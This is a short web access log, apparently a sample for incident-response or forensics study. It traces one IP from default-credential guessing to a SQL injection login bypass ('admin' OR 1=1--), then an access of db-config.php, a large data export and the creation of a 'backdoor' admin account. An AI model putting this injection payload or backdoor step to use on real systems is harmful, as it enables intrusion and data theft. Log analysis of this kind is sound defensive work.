```bash
192.168.10.50 - - [22/Jan/2025:11:55:00 +0000] "GET /admin/login.php HTTP/1.1" 200 1234
192.168.10.50 - - [22/Jan/2025:12:00:15 +0000] "GET /admin/login.php?user=admin&pass=admin HTTP/1.1" 401 567
192.168.10.50 - - [22/Jan/2025:12:00:30 +0000] "GET /admin/login.php?user=admin' OR 1=1--&pass=x HTTP/1.1" 200 5678
192.168.10.50 - - [22/Jan/2025:12:05:00 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 8901
192.168.10.50 - - [22/Jan/2025:12:10:00 +0000] "GET /admin/db-config.php HTTP/1.1" 200 234
192.168.10.50 - - [22/Jan/2025:12:15:00 +0000] "POST /admin/export-data.php HTTP/1.1" 200 45123456
192.168.10.50 - - [22/Jan/2025:13:00:00 +0000] "GET /admin/create-user.php?user=backdoor&pass=Passw0rd123!&role=admin HTTP/1.1" 200 123
```
